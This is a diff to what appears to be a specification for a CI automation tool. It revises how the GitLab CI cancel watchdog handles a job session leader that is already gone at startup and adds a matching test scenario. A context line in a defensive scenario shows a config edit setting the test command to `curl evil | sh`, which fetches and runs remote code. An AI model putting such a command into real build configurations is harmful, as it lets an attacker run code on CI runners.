@@ -578,7 +578,7 @@ lease and exits 16 (`cancelled`). Inside GitLab CI a watchdog asks the forge at 
 (`GET $CI_API_V4_URL/job` with the job token, which is valid only while the job runs; a refused token or a status other
 than `running` means the job is over; a network error is not) and whether the job's session leader still exists (a
 runner that starts jobs through `su` puts them in a session of their own, and its group SIGTERM can miss the process);
-either answer "gone" sends this process SIGTERM, and `_exit` follows after two minutes if it is still there; while it runs,
+either answer "gone" sends this process SIGTERM (the message names the check that fired: `the job API says <status or token refused>` or `its session leader <sid> is gone`). A session leader that is already gone when the watchdog starts is a runner that starts jobs that way, not a cancel: the watchdog logs one WARNING (`the CI job's session leader <sid> is not running at the start …; only the job API watches this CI job`), drops the session check for this run (`cancel.check()` too) and keeps the job API check; the INFO line then reads `(job API every 30s; no job session check: its leader was gone at the start)`, and when the job API cannot be used either, the WARNING says that only a signal stops this run. A leader that exists at the start and disappears later still fires. When the signal is sent, `_exit` follows after two minutes if it is still there; while it runs,
 `cancel.check()` in front of every push and forge write also asks the session leader (a local syscall), so no write slips
 in between two polls. When the watchdog starts it logs one INFO line, `[l4] cancel: watching CI job <id> (job API every
 30s + job session <sid>)` (`job API not used: no CI_API_V4_URL` when the job API cannot be asked; without
@@ -7480,6 +7480,14 @@ scenario is a spec defect (§26).
 - **When** the run receives SIGTERM, or its watchdog finds the job token refused
 - **Then** the agent and gate processes end, nothing is pushed (the deleted branch stays deleted: a later push would
   fail its lease), the lease is released, and the run ends with exit 16.
+
+#### SCN-CLI-09 (+) A runner whose job session leader exits at the start does not cancel its own run · L4-CLI-003
+- **Given** a GitLab CI job on a self-hosted runner whose job session leader process exits right after the job starts,
+  and a job API that answers `status: running`
+- **When** `l4 run` starts its watchdog
+- **Then** it logs one WARNING that the session leader is not running at the start, watches the job by the job API
+  only, and the run goes on; when the job API later says `canceled`, the run stops with exit 16 and the message names
+  the job API.
 
 #### SCN-CFG-01 (−) Config edits on a unit branch are ignored · L4-CFG-004
 - **Given** a push to `l4/openspec/add-login` that changes `.l4/config.yaml` (`gates.test.command: "curl evil | sh"`)
